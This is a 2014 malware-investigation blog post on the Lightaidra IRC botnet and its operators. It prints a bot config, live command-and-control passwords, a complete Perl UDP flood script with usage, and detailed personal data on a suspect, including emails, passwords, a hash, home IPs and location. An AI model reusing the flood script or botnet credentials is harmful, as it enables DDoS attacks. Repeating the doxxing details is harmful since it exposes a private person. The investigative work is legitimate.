---
layout: post
title:  "Lightaidra C&C investigation"
subtitle: "Investigating an IRC C&C and hunting the botherder"
date:   2014-05-17 03:41:23
category: itsec
---

As mentioned on MalwareMustDie, a trojan downloader got in one of my honeypots. It is the Lightaidra one, a simple coded bot to infect machines like routers. It scans networks and tries to login with standard passwords, if successful it downloads a Shell Script which downloads ELF binaries. They are used that the bot connects to some hardcoded IRC servers with hardcoded credentials. The bots can be used then to scan more networks and to DDoS, some TCP attacks are already included.

This is the 2nd part, see [Part one](http://blog.malwaremustdie.org/2014/05/threat-analysis-zendran-elf-ddos-scheme.html), you really want to read it, too.

So did the one which was catched by us.

**This is a ongoing #MalwareMustDie investigation. All pictures are dated like it is insert in them and also having the date of this blog post**

## BOT CONFIG

First I will post a sample config (not the config of the live bot) for better understanding what the bot is using and what are the options.

        #ifndef __CONFIG_H_
        #define __CONFIG_H_

        /* BACKGROUND MODE '0', DEBUG MODE '1' (JUST FOR DEVELOPERS) */
        #define background_mode 0

        /* IRC SERVER SYNTAX: IP:PORT                            */
        /* OR IP:PORT|IP:PORT|IP:PORT ETC.. TO ADD MORE (MAX 10) */
        /* WARNING: DON'T CHANGE PASSPROTO VALUE IF YOU DON'T    */
        /* HAVE AN MODDED PROTOCOL IRCD!!!                       */
        #define irc_servers  "127.0.0.1:6666|127.0.0.2:6667"
        #define passproto    "PASS"
        #define irc_passwd   "fuckya"
        /* IRC SERVER ENCRYPTED 0=IRC_SERVERS 1=ENC_SERVERS */
        /* USE HIDE.C TO CREATE YOUR CRYPTED SERVER LIST    */
        #define encirc 0
        #define enc_servers ">.,C_>C>,C@<@U+<<<F>.,C_>C>,C@<>U+<<<F>.,C_>C>,C@<<U+<<<F>.,C_>C>,C@<_U+<<<"
        #define enc_passwd  "bcdi"

        /* CHANNEL NAME */
        #define irc_chan      "#chan"
        /* ENABLE FULL MESSAGES, '0'=OFF '1'=ON */
        /* NOTE: THAT PRODUCE MORE LAG!         */
        #define all_messages  0
        /* CHANNEL KEY */
        #define irc_chankey   "key"

        /* MASTER HOSTNAME WILL BE ABLE TO PERFORM AUTHENTICATION */
        #define master_host     "@hostname.tld"
        /* MASTER PASSWORD AUTHENTICATION (BOT PARTYLINE) */
        #define master_password "pwn"

        /* HTTP REFERENCE (WHERE YOU UPLOAD BINARIES AND GETBINARIES.SH) */
        #define reference_http  "http://127.0.0.1"

        /* NAME OF BINARIES: IF YOU CHANGE THESE VALUES, DON'T FORGET */
        /* TO CHANGE TOO IN MAKEFILE AND GETBINARIES.SH               */
        #define reference_mipsel   "mipsel"
        #define reference_mips     "mips"
        #define reference_superh   "sh"
        #define reference_arm      "arm"
        #define reference_ppc      "ppc"

        /* NICKNAME PREFIX:                     */
        /* WARNING: DO NOT CHANGE NCTYPE VALUE! */
        /* NOTE: MAXTHREADS ARE FOR SCANNER,    */
        /* DON'T CHANGE IF YOU DON'T KNOW WHAT  */
        /* YOU ARE DOING!                       */
        #ifdef MIPSEL
            #define irc_nick_prefix   "[MS]"
            #define nctype "m"
            #define maxthreads (128)
        #elif MIPS
            #define irc_nick_prefix   "[M]"
            #define nctype "m"
            #define maxthreads (128)
        #elif SUPERH
            #define irc_nick_prefix   "[S]"
            #define nctype "s"
            #define maxthreads (128)
        #elif ARM
            #define irc_nick_prefix   "[A]"
            #define nctype "a"
            #define maxthreads (128)
        #elif PPC
            #define irc_nick_prefix   "[P]"
            #define nctype "p"
            #define maxthreads (128)
        #else
            #define irc_nick_prefix   "[X]"
            #define nctype "x"
            #define maxthreads (128)
        #endif

        #endif

As you see, it is fairly simple configured, the IRC Servers are set, the passwords and where it downloads the ELF files. Also the nickname prefix depends of the enviroment.

## C&C INFORMATION

The credentials can be also reversed, I think the bot owner did not use encirc, which will encrypt the servers with a static string.
We got this IP to connect to:

        IP Address: 178.18.16.96
        City: Asheville
        State or Region: North Carolina
        Country: United States
        ISP: Egihosting
        Latitude & Longitude: 35.5830-82.6050
        Domain: reachmapster.com
        ZIP Code: 28806

or a successfull connection we need to use the */USERS* command as stated in the bot: */USER* ass localhost localhost :Stallion, also we have to spoof the nickname. As unixfreaxjp helped we saw it in the pcap how it has to look: [CPU manufacturer]randomstring: **[Intel]uzi7ayw**. Also the servers uses a password which is: **eYmUrmyAfG**
And here comes also the tricky part: the IRC server uses port 80 for spoofing. Curl'ing the header:

        :Hell.Network
        :Hell.Network
        :Hell.Network 451 HEAD :You have not registered
        :Hell.Network 451 User-Agent: :You have not registered
        :Hell.Network 451 Host: :You have not registered
        :Hell.Network 451 Accept: :You have not registered

What? Yes! This is a ircd, not a httpd! Also, already did a nmap scan, so you don't need to tickle that server too much:

        Nmap scan report for 178.18.16.96
        Host is up (0.51s latency).
        Not shown: 996 closed ports
        PORT    STATE SERVICE VERSION
        22/tcp  open  ssh     OpenSSH 5.3 (protocol 2.0)
        80/tcp  open  http?
        443/tcp open  https?
        444/tcp open  snpp?
        3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
        ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
        SF-Port80-TCP:V=6.40%I=7%D=5/17%Time=53771EC7%P=x86_64-unknown-linux-gnu%r
        SF:(NULL,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(GetRequest,5
        SF:0,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x2
        SF:0GET\x20:You\x20have\x20not\x20registered\r\n")%r(HTTPOptions,54,":Hell
        SF:\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x20OPTIONS
        SF:\x20:You\x20have\x20not\x20registered\r\n")%r(RTSPRequest,54,":Hell\.Ne
        SF:twork\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x20OPTIONS\x20
        SF::You\x20have\x20not\x20registered\r\n")%r(X11Probe,20,":Hell\.Network\x
        SF:20\r\n:Hell\.Network\x20\r\n")%r(FourOhFourRequest,50,":Hell\.Network\x
        SF:20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x20GET\x20:You\x20hav
        SF:e\x20not\x20registered\r\n")%r(GenericLines,20,":Hell\.Network\x20\r\n:
        SF:Hell\.Network\x20\r\n")%r(RPCCheck,20,":Hell\.Network\x20\r\n:Hell\.Net
        SF:work\x20\r\n")%r(DNSVersionBindReq,20,":Hell\.Network\x20\r\n:Hell\.Net
        SF:work\x20\r\n")%r(DNSStatusRequest,20,":Hell\.Network\x20\r\n:Hell\.Netw
        SF:ork\x20\r\n")%r(Help,51,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:H
        SF:ell\.Network\x20451\x20HELP\x20:You\x20have\x20not\x20registered\r\n")%
        SF:r(SSLSessionReq,4F,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.
        SF:Network\x20451\x20\x16\x03\x20:You\x20have\x20not\x20registered\r\n")%r
        SF:(Kerberos,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(SMBProgN
        SF:eg,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(LPDString,55,":
        SF:Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x20\x0
        SF:1default\x20:You\x20have\x20not\x20registered\r\n")%r(LDAPBindReq,20,":
        SF:Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(SIPOptions,22D,":Hell\.
        SF:Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x20OPTIONS\x
        SF:20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x20Via:\x2
        SF:0:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x20From:\x2
        SF:0:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x20To:\x20:
        SF:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x20Call-ID:\x
        SF:20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x20CSeq:\x
        SF:20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x20Max-For
        SF:wards:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x2
        SF:0Content-Length:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network
        SF:\x20451\x20Contact:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Netw
        SF:ork\x20451\x20Accept:\x20:You\x20have\x20not\x20registered\r\n");
        ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
        SF-Port443-TCP:V=6.40%I=7%D=5/17%Time=53771EC7%P=x86_64-unknown-linux-gnu%
        SF:r(NULL,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(HTTPOptions
        SF:,54,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\
        SF:x20OPTIONS\x20:You\x20have\x20not\x20registered\r\n")%r(SSLSessionReq,4
        SF:F,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x2
        SF:0\x16\x03\x20:You\x20have\x20not\x20registered\r\n")%r(SSLv23SessionReq
        SF:,52,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\
        SF:x20\x80\x9e\x01\x03\x01\x20:You\x20have\x20not\x20registered\r\n")%r(X1
        SF:1Probe,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(vmware-esx,
        SF:20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(GenericLines,20,":
        SF:Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(GetRequest,50,":Hell\.N
        SF:etwork\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x20GET\x20:Yo
        SF:u\x20have\x20not\x20registered\r\n")%r(RTSPRequest,54,":Hell\.Network\x
        SF:20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x20OPTIONS\x20:You\x2
        SF:0have\x20not\x20registered\r\n")%r(RPCCheck,20,":Hell\.Network\x20\r\n:
        SF:Hell\.Network\x20\r\n")%r(DNSVersionBindReq,20,":Hell\.Network\x20\r\n:
        SF:Hell\.Network\x20\r\n")%r(DNSStatusRequest,20,":Hell\.Network\x20\r\n:H
        SF:ell\.Network\x20\r\n")%r(Help,51,":Hell\.Network\x20\r\n:Hell\.Network\
        SF:x20\r\n:Hell\.Network\x20451\x20HELP\x20:You\x20have\x20not\x20register
        SF:ed\r\n")%r(Kerberos,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%
        SF:r(SMBProgNeg,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(FourO
        SF:hFourRequest,50,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Net
        SF:work\x20451\x20GET\x20:You\x20have\x20not\x20registered\r\n")%r(LPDStri
        SF:ng,55,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x2045
        SF:1\x20\x01default\x20:You\x20have\x20not\x20registered\r\n")%r(LDAPBindR
        SF:eq,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(SIPOptions,22D,
        SF:":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x20O
        SF:PTIONS\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x2
        SF:0Via:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x20
        SF:From:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x20
        SF:To:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x20Ca
        SF:ll-ID:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x2
        SF:0CSeq:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20451\x2
        SF:0Max-Forwards:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x
        SF:20451\x20Content-Length:\x20:You\x20have\x20not\x20registered\r\n:Hell\
        SF:.Network\x20451\x20Contact:\x20:You\x20have\x20not\x20registered\r\n:He
        SF:ll\.Network\x20451\x20Accept:\x20:You\x20have\x20not\x20registered\r\n"
        SF:);
        ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
        SF-Port444-TCP:V=6.40%I=7%D=5/17%Time=53771EC7%P=x86_64-unknown-linux-gnu%
        SF:r(NULL,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(SSLSessionR
        SF:eq,4F,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x2045
        SF:1\x20\x16\x03\x20:You\x20have\x20not\x20registered\r\n")%r(SSLv23Sessio
        SF:nReq,52,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20
        SF:451\x20\x80\x9e\x01\x03\x01\x20:You\x20have\x20not\x20registered\r\n")%
        SF:r(GenericLines,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(Get
        SF:Request,50,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\
        SF:x20451\x20GET\x20:You\x20have\x20not\x20registered\r\n")%r(HTTPOptions,
        SF:54,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x
        SF:20OPTIONS\x20:You\x20have\x20not\x20registered\r\n")%r(RTSPRequest,54,"
        SF::Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x20OP
        SF:TIONS\x20:You\x20have\x20not\x20registered\r\n")%r(RPCCheck,20,":Hell\.
        SF:Network\x20\r\n:Hell\.Network\x20\r\n")%r(DNSVersionBindReq,20,":Hell\.
        SF:Network\x20\r\n:Hell\.Network\x20\r\n")%r(DNSStatusRequest,20,":Hell\.N
        SF:etwork\x20\r\n:Hell\.Network\x20\r\n")%r(Help,51,":Hell\.Network\x20\r\
        SF:n:Hell\.Network\x20\r\n:Hell\.Network\x20451\x20HELP\x20:You\x20have\x2
        SF:0not\x20registered\r\n")%r(Kerberos,20,":Hell\.Network\x20\r\n:Hell\.Ne
        SF:twork\x20\r\n")%r(SMBProgNeg,20,":Hell\.Network\x20\r\n:Hell\.Network\x
        SF:20\r\n")%r(X11Probe,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%
        SF:r(FourOhFourRequest,50,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:He
        SF:ll\.Network\x20451\x20GET\x20:You\x20have\x20not\x20registered\r\n")%r(
        SF:LPDString,55,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Networ
        SF:k\x20451\x20\x01default\x20:You\x20have\x20not\x20registered\r\n")%r(LD
        SF:APBindReq,20,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n")%r(SIPOptio
        SF:ns,22D,":Hell\.Network\x20\r\n:Hell\.Network\x20\r\n:Hell\.Network\x204
        SF:51\x20OPTIONS\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x2
        SF:0451\x20Via:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20
        SF:451\x20From:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x20
        SF:451\x20To:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x2045
        SF:1\x20Call-ID:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x2
        SF:0451\x20CSeq:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Network\x2
        SF:0451\x20Max-Forwards:\x20:You\x20have\x20not\x20registered\r\n:Hell\.Ne
        SF:twork\x20451\x20Content-Length:\x20:You\x20have\x20not\x20registered\r\
        SF:n:Hell\.Network\x20451\x20Contact:\x20:You\x20have\x20not\x20registered
        SF:\r\n:Hell\.Network\x20451\x20Accept:\x20:You\x20have\x20not\x20register
        SF:ed\r\n");

        Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
        # Nmap done at Sat May 17 10:36:25 2014 -- 1 IP address (1 host up) scanned in 728.32 seconds

And as seen here (paste no more aviable) it downloads from 192.99.168.37:

        IP Address: 192.99.168.37
        City: Montreal
        State or Region: Quebec
        Country: Canada
        ISP: Ovh Sas
        Latitude & Longitude: 45.6060-73.6390

Nmap:

        Starting Nmap 6.40 ( http://nmap.org ) at 2014-05-17 11:18 CEST
        Nmap scan report for 192.99.168.37
        Host is up (0.37s latency).
        Not shown: 998 closed ports
        PORT   STATE SERVICE VERSION
        21/tcp open  ftp     vsftpd 2.2.2
        22/tcp open  ssh     OpenSSH 5.3 (protocol 2.0)
        Service Info: OS: Unix

        Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 420.97 seconds

## C&C CONNECTION

Okay, with all these information we connect to the ircd on port 80:

        Mai 13 18:00:59 »»    Connecting to 178.18.16.96:80 (178.18.16.96) port 80...
        Mai 13 18:01:00 »»    Connected. Now logging in...
        Mai 13 18:01:00 GARBAGE: Hell.Network
        Mai 13 18:01:06 GARBAGE: Hell.Network

And then we get this:

        Mai 13 18:15:20 »»
        Mai 13 18:15:20 »»                   M0dded by uNkn0wn Crew
        Mai 13 18:15:20 »»
        Mai 13 18:15:20 »»              www.uNkn0wn.eu - iD@uNkn0wn.eu
        Mai 13 18:15:20 »»
        Mai 13 18:15:20 »»
        Mai 13 18:15:20 »»
        Mai 13 18:15:20 »»    MOTD File is missing
        Mai 13 18:15:20 »»    NICKSERV :Unknown command
        Mai 13 18:24:32 »»    You may not reregister

Yes, modded UnrealIRC. And a really bad one if you want to investigate. The server won't give you any users list of channels, you cannot /whois or run any other commands which are telling you informations. Only IRC Ops can do that.
/time gave me: Mai 13 18:31:47 »» Hell.Network :Tuesday May 13 2014 -- 17:16 +00:00 /links gave me: Mai 13 18:36:56 »» Hell.Network Hell.Network :1 HellNetwork And that was it, no more information for us :-(
/oper won't work, too. You have to have a certain hostmask to be allowed to do that. So I also cannot brute force a IRC Operator account. The channel for bots is **#LA** with no passwords, the topic of the channel is "**PMA is NOTHING compared to StyxCoD**". These are names of cheating tools for the game Call of Duty, so we get the information that we have to do with gaming skiddos.
As we see the topic was created by a guy with the nickname **Izan**, with the hostmask: **Zendran@UnderWorld**. When we do a quick search for **Zendran** we see a hackforums post: [www.hackforums.net/showt...pid=29911898#pid29911898](http://www.hackforums.net/showthread.php?tid=3194396&pid=29911898#pid29911898)
A vouché from a guy named **Zendran**:

![](https://i.imgur.com/0yqD6Io.png)

So this guy is maybe using also a free booting service for gaming kiddos, the advertisement video shows how they DDoS a gamer:

(Video got deleted, saved for intel)

This leads us even more to the conclusion that the bad actors are gaming children.

His **Hackforums account**:

![](https://i.imgur.com/OMCATUB.png)

A thread from him:

![](https://i.imgur.com/5g0BbEV.png)

We have also another bot herder: **Styx: g@UnderWorld**

## THE BAD STUFF

As I stay in channel I got this:

        03:31 <Izan> .login a
        03:31 <Izan> .login pussy

Here you see the login command to connected bots, the password is **pussy**. Staying longer I got this:

        03:46 <Styx> .login pussy
        03:46 <Styx> .std xxx.xxx.xxx.xxx 80 30
        03:46 <[Intel]7l2swwc> [STD] Hitting xxx.xxx.xxx.xxx on port 80 for  30 seconds
        03:46 <[Intel]7l2swwc> [STD] finished hitting xxx.xxx.xxx.xxx!

An alive bot! With hostmask: **ass@xxx.xxxx.xxxx**, machine which got infected.
And they did an attack on IP **xxx.xxx.xxx.xxx**.
(**we cannot publish the IP details because of ongoing investigation**)

## INVESTIGATION OF THE BAD ACTOR

Getting infos of a guy called **styx** is pretty useless, this is a high used alias, so let's focus on **Zendran**:

I found a YouTube Channel of a CoD Hacker: [www.youtube.com/channel/UCtgngnplkMmcvWqHhyudpqA](www.youtube.com/channel/UCtgngnplkMmcvWqHhyudpqA)
Also I found posts of complaining about a game hacker called Zendran:
[XBox Forum Thread](http://forums.xbox.com/xbox_forums/general_discussion/f/2176/t/1169547.aspx)

        READ!! Watch out for this HACKER! Report him. - Xbox.com ...
        forums.xbox.com/xbox_forums/.../1169547.aspx
        14.05.2013 - I recently recieved DDoS attacks from a xbox guy named [Mod ... Hey Zendran, sorry to see you ran across someone behaving badly on LIVE.

Google cached search.

Zendran talking about DDoS:
[https://plus.google.com/105260185472854523472/posts/EsicGY5C9t8](https://plus.google.com/105260185472854523472/posts/EsicGY5C9t8)

![](https://i.imgur.com/DMIkD8y.png)

Here you see how he proofes that his VPN cannot be DDoS'ed. Informations out of this video:

        IP Address: 142.4.195.174
        City: Alvin
        State or Region: Texas
        Country: United States
        ISP: Ovh Sas
        Latitude & Longitude: 29.4220-95.2470
        Domain: upperclass.io
        ZIP Code: 77511

Peer IP (looks like home connection):

        IP Address: 67.190.229.13
        City: Jacksonville
        State or Region: Florida
        Country: United States
        ISP: Comcast Cable Communications Inc.
        Latitude & Longitude: 30.3280-81.6520
        Domain: comcast.net
        ZIP Code: 32210

![](https://i.imgur.com/edfzM5N.png)

Another CnC:

![](https://i.imgur.com/dYVagBc.png)

Booter **ipstresser.com** account:

(image removed, saved for intel)

Attacking **titanfall.com**, website of Electronic Arts Inc.

![](https://i.imgur.com/aV3BaET.png)
![](https://i.imgur.com/g212Q9C.png)

Skype talk about servers:

![](https://i.imgur.com/M5VOxG8.png)

His DDoS script in Perl:
https://www.youtube.com/watch?v=SE9msU8cVZQ (he deleted it, saved for intel)

![](https://i.imgur.com/EidiujH.png)

Download: [www.mediafire.com/downlo...39xf88ka62fns8e/iyzan.pl ](http://www.mediafire.com/download/39xf88ka62fns8e/iyzan.pl)
(shared by toshiro hetsugaya)

Paste:

        #!/usr/bin/perl

        ##
        # PERL DoS Script
        ##

        use Socket;
        use strict;

        my ($ip,$port,$size,$time) = @ARGV;

        my ($iaddr,$endtime,$psize,$pport);

        $iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
        $endtime = time() + ($time ? $time : 100);
        socket(flood, PF_INET, SOCK_DGRAM, 17);


        print <<EOTEXT;
        #############   #     #   ############          ##         #       #
              #          #   #              #          #  #        # #     #
              #           # #             #           #    #       #  #    #
              #            #            #            ########      #   #   #
              #            #          #             #        #     #    #  #
              #            #        #              #          #    #     # #
        #############      #      ############    #            #   #      ##

        EOTEXT

         print           "                        YouTube.com/ZendranQs $ip
                    On port " .
                ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
        Talk shit get Hit. ") . "\n";
                ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
        Talk shit get FaRted On. ") . "\n";
                print "Stop DoSing with Ctrl-C\n" unless $time;

        for (;time() <= $endtime;) {
          $psize = $size ? $size : int(rand(1024-64)+64) ;
          $pport = $port ? $port : int(rand(65500))+1;

          send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
        $iaddr));}

This just sends messages with random size to the target, a really simple DoS tool.
[www.tutorialspoint.com/perl/perl_send.htm](www.tutorialspoint.com/perl/perl_send.htm)

Usage is pretty simple, first argument is the IP, second the port (can be left blank for random port), 3rd the message size (can be left blank) and the 4th for the time (how long this will be run, can be left blank). Running it:

        $ ./iyzan.pl 127.0.0.1 80
        #############   #     #   ############          ##         #       #
              #          #   #              #          #  #        # #     #
              #           # #             #           #    #       #  #    #
              #            #            #            ########      #   #   #
              #            #          #             #        #     #    #  #
              #            #        #              #          #    #     # #
        #############      #      ############    #            #   #      ##

                                  YouTube.com/ZendranQs 127.0.0.1
                                On port 80
        Talk shit get Hit.
        Stop DoSing with Ctrl-C

I tested it on one of my VM's and it got offline, better, it got really dead. Try it yourself on 127.0.0.1 on a test machine. I won't add an attack log, as I don't want to attack any servers.

Investiagtion is still ongoing for getting personal details. If you found anything more, comments are open to this post.

Other Zendran links:
[www.thetechgame.com/zendran ](http://www.thetechgame.com/zendran )
[www.youtube.com/watch?v=C9YCSAmvGpQ](http://www.youtube.com/watch?v=C9YCSAmvGpQ)

XBox handle:
[live.xbox.com/en-US/Profile?gamertag=Zendran](http://live.xbox.com/en-US/Profile?gamertag=Zendran)

Skype: **zendranqs**

![](https://i.imgur.com/Cte9sHB.png)

His mailaccounts are *zendranqs[at]yahoo[doto]com* and *moore.johnny[at]rocketmail[doto]com*. the rocketmail mail is used often by him for booters.
**Used passwords: 123cheesecake; skateboard; nitro
User ID in NitroBooter: 868; Dump:**

        INSERT INTO `users` VALUES('868', 'zendran', '72611550180caa6f217dd785a7b8c3e862e8c91b', 'moore.johnny@rocketmail.com', '0', '64', '2147483647', '0');

        INSERT INTO `loginlogs` VALUES('zendran', '50.159.130.206', '1368740835');
        INSERT INTO `loginlogs` VALUES('zendran', '50.159.130.206', '1368743608');
        INSERT INTO `loginlogs` VALUES('zendran', '50.159.130.206', '1368761588');

Dig:

        ; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> +additional @130.95.128.1 -x 50.159.130.206
        ; (1 server found)
        ;; global options: +cmd
        ;; Got answer:
        ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 63017
        ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 5, ADDITIONAL: 3

        ;; QUESTION SECTION:
        ;206.130.159.50.in-addr.arpa.    IN  PTR

        ;; ANSWER SECTION:
        206.130.159.50.in-addr.arpa. 7200 IN    PTR c-50-159-130-206.hsd1.fl.comcast.net.

        ;; AUTHORITY SECTION:
        130.159.50.in-addr.arpa. 7200    IN  NS  dns104.comcast.net.
        130.159.50.in-addr.arpa. 7200    IN  NS  dns103.comcast.net.
        130.159.50.in-addr.arpa. 7200    IN  NS  dns101.comcast.net.
        130.159.50.in-addr.arpa. 7200    IN  NS  dns105.comcast.net.
        130.159.50.in-addr.arpa. 7200    IN  NS  dns102.comcast.net.

        ;; ADDITIONAL SECTION:
        dns101.comcast.net.    6340    IN  A   69.252.250.103
        dns102.comcast.net.    5631    IN  A   68.87.85.132
        dns103.comcast.net.    3197    IN  A   68.87.76.228

        ;; Query time: 828 msec
        ;; SERVER: 130.95.128.1#53(130.95.128.1)
        ;; WHEN: Wed Jun 25 20:54:48 2014
        ;; MSG SIZE  rcvd: 248

Location: Jacksonville

His Twitter handle:
[twitter.com/Zendrenqs](https://twitter.com/Zendrenqs)


Handle these information with care!

## CONCLUSION

As you see it is pretty simple to analyse lightaidra. Also we have to assume that these tools are used by people which are new to malware crimes. If we stop them NOW we might push them in the right direction to stop doing malware crimes.
The only thing which is a stone in my path is the ircd, analysis is still ongoing.

Get the modded UnrealIRC [here](https://drive.google.com/file/d/0BxpNZDnuNF9pdS1XUVF4R1RZbUE/edit).

My thoughts are that these guys are following stupid HowTo's of malware. This really looks like pre-configured.

This is part 2 of 2, part 1 is [here](http://blog.malwaremustdie.org/2014/05/threat-analysis-zendran-elf-ddos-scheme.html)

**PS:**

thanks to *justaguy* for getting some hints of **LightAidra**

And the biggest thanks goes to **unixfreaxjp** for reversing the ELF's and for all! You rock!

![](https://i.imgur.com/AiRTnRD.png)

## 1ST UPDATE

Styx, the bot herder, contacted me via Twitter:

![](https://i.imgur.com/uCwGsmo.png)

Hope Zendran won't talk too much :)

![](https://i.imgur.com/DfDcC6V.png)

Another update:

<blockquote class="twitter-tweet" lang="de"><p lang="en" dir="ltr">Multi-arc <a href="https://twitter.com/hashtag/linux?src=hash">#linux</a> router hacker actor is in &quot;Exiled&quot; (pic). &#10;He is in Jacksonville,FL,USA&#10;Case: <a href="http://t.co/5S0kHrqK3o">http://t.co/5S0kHrqK3o</a> <a href="http://t.co/NuETE4dtz6">pic.twitter.com/NuETE4dtz6</a></p>&mdash; ☩MalwareMustDie (@MalwareMustDie) <a href="https://twitter.com/MalwareMustDie/status/471263153641095168">27. Mai 2014</a></blockquote>
<script async src="//platform.twitter.com/widgets.js" charset="utf-8"></script>

## 2ND UPDATE

Seems like **Zendran** want's to make money now:

![](https://i.imgur.com/YI7kXLR.png)